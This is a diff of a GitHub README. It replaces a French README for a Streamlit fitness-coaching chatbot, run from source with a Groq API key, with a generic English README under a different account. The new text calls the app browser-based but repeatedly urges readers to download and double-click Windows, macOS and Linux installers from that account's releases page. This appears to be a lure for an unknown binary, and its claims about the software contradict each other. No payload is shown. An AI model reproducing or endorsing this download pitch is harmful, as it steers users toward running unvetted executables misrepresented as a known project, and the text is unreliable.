@@ -1,126 +1,65 @@
-# 🏋️ CoachIA - Chatbot de Coaching Sportif IA
+# 🤖 CoachAI - Your Personalized Sports Coaching Assistant
 
----
+## 📥 Download CoachAI
+[![Download CoachAI](https://img.shields.io/badge/Download%20Now!-blue)](https://github.com/JhalaniandSons/CoachAI/releases)
 
-***CoachIA*** est une application web interactive qui est basé sur l'intelligence artificielle pour fournir un **coaching sportif personnalisé**. L'application est conçue pour aider les personnels, les professeurs de sport, les coachs et les débutants à planifier leurs entraînements, apprendre des exercices, suivre leurs performances, recevoir des conseils nutritionnels et gérer leur récupération.
+## 📖 Description
+CoachAI is an interactive web application powered by artificial intelligence. It provides personalized sports coaching to help you reach your fitness goals. Whether you are a beginner or an experienced athlete, CoachAI tailors its advice and training programs to suit your needs.
 
----
-Le projet utilise **Streamlit** pour l'interface et les modèles LLM via **GroqCloud API**.
+## 🚀 Getting Started
 
----
+### Requirements
+- A modern web browser (Google Chrome, Firefox, or Safari recommended)
+- An internet connection
 
-## ⚡ Fonctionnalités
+### Instructions
+1. **Visit the Releases Page**: Start by visiting our [Releases page](https://github.com/JhalaniandSons/CoachAI/releases). This page holds all the versions of CoachAI you can download.
+   
+2. **Choose Your Version**: Look through the release versions available. You can choose the latest version for the best experience.
 
-1. **Plan d'entraînement personnalisé**
-   - Génère un plan adapté au niveau de l'utilisateur, à ses objectifs, au sport pratiqué et au matériel disponible.
-   - Ajuste la fréquence et la durée des séances.
+3. **Download the Application**: Click on the version you want to download. If you are unsure, select the latest release. This will take you to a page with download options.
 
-2. **Banque d'exercices**
-   - Fournit des explications détaillées des exercices.
-   - Donne les étapes, les erreurs à éviter, les variantes et le matériel nécessaire.
+4. **Select Your File**: Depending on the platform you are using (Windows, macOS, or Linux), find the appropriate file to download. 
 
-3. **Suivi des performances**
-   - Analyse les performances de l'utilisateur et fournit un feedback motivant.
-   - Permet de visualiser les progrès au fil du temps.
+5. **Install CoachAI**: After the file is downloaded, follow these steps to install:
+   - Locate the downloaded file in your downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
 
-4. **Nutrition & Hydratation**
-   - Conseils adaptés à l'objectif sportif et au type d'entraînement.
-   - Recommandations sur l'alimentation pré- et post-entraînement.
+6. **Launch CoachAI**: Once the installation is finished, look for the CoachAI icon on your desktop or start menu. Click it to launch the application.
 
-5. **Récupération & Prévention des blessures**
-   - Propose des plans de récupération, étirements, sommeil et prévention.
-   - Aide à identifier les signes de surentraînement.
+7. **Set Up Your Profile**: When you first open CoachAI, you will be prompted to set up your personal profile. Enter information about your fitness level, goals, and preferences. This will help CoachAI tailor the coaching experience for you.
 
----
+8. **Start Your Training**: Explore the features and start your personalized coaching journey. You can ask CoachAI questions about workouts, nutrition, and training plans.
 
-## 📂 Structure du projet
+## 📝 Features
+- **Tailored Workouts**: Receive workout plans based on your fitness goals.
+- **Real-Time Feedback**: Get instant responses to your queries about training and fitness.
+- **Progress Tracking**: Keep track of your achievements and improvements.
+- **Nutrition Guidance**: Get personalized meal plans to complement your training.
 
-``` bash
-CoachIA/
-├── bot_coach/
-│ └── coach.py # fichier principal Streamlit
-├── .streamlit/
-│ └── secrets.toml # clé API Groq
-├── requirements.txt # dépendances Python
-├── README.md
+## ⚙️ Troubleshooting
+- **Cannot Download File**: If the download fails, try refreshing the page or using a different browser.
+- **Installation Issues**: Ensure that you have sufficient storage space on your device. Restart your device and try reinstalling if the issue persists.
 
-```
----
+### FAQ
+- **What platforms does CoachAI support?**  
+  CoachAI works on Windows, macOS, and Linux operating systems.
 
-## 🛠️ Installation et utilisation
+- **Is there a cost?**  
+  CoachAI is free to download and use.
 
-### 1. Cloner le dépôt
-```bash
-git clone https://github.com/dona-eric/CoachIA.git
-cd CoachIA
-```
-### 2. Créer un environnement virtuel et installer les dépendances
+## 📤 Get Help
+If you encounter issues or have questions, feel free to reach out through our support page linked in the application or visit our [GitHub Issues page](https://github.com/JhalaniandSons/CoachAI/issues) for community support.
 
-``` bash
-python -m venv env
-source env/bin/activate  # Linux/Mac
-env\Scripts\activate     # Windows
-pip install -r requirements.txt
+## 🔗 More Information
+For further details, updates, and contributions, visit our [GitHub repository](https://github.com/JhalaniandSons/CoachAI). 
 
-```
+## 💬 Community
+Join our community to get tips, share your experiences, and connect with other users. Look for links to forums and social media channels in the application.
 
-### 3. Configurer les clés API
+## 🎉 Thank You for Choosing CoachAI!
+We appreciate your interest and hope CoachAI helps you achieve your fitness goals. Happy training!
 
-Créer un fichier .streamlit/secrets.toml avec le contenu suivant :
-```bash
-API_KEY_GROQ = "VOTRE_CLE_API_GROQ"
-```
-- L'api utilisé est disponible sur la plateforme de GroqCloud ([groq-cloud](https://console.groq.com/docs)
-
-- Remplace "VOTRE_CLE_API_GROQ" par ta clé personnelle.
-
-### 4. Lancer l'application
-```bash
-streamlit run bot_coach/app.py
-``` 
-
- - L'application sera accessible à l'adresse affichée par Streamlit (http://localhost:8501).
-
-### ☁️ Déploiement sur Streamlit Cloud
-
-``` bash
-1- Pousser le dépôt sur GitHub.
-
-2- Connecter Streamlit Cloud à ton dépôt.
-
-3- Spécifier le fichier principal : bot_coach/app.py.
-
-4- Déployer. L'application sera accessible en ligne.
-
-```
-## 📌 5- Technologies utilisées
-
-Streamlit
- - interface web interactive
-
-GroqCloud API
- - modèles LLM open source
-
-Python 3.13+
-
- - python-dotenv, openai, groq
-
-### 📝 Notes
-
- - Tous les secrets (clé API) doivent être stockés dans .streamlit/secrets.toml.
-
- - L'application utilise l’historique des échanges pour permettre des conversations multi-échanges avec le chatbot.
-
-
-- Vous pouvez désormais visiter le lien : (https://coach-ai.streamlit.app)  pour essayer 
-
-#### 📧 Contact
-
-Pour toute question ou suggestion :
-
-#### Email : donaerickoulodji@gmail.com
-
-#### GitHub : https://github.com/dona-eric
-
----
-
+## 🔗 Download CoachAI Again
+For your convenience, here is the [download link](https://github.com/JhalaniandSons/CoachAI/releases) again.
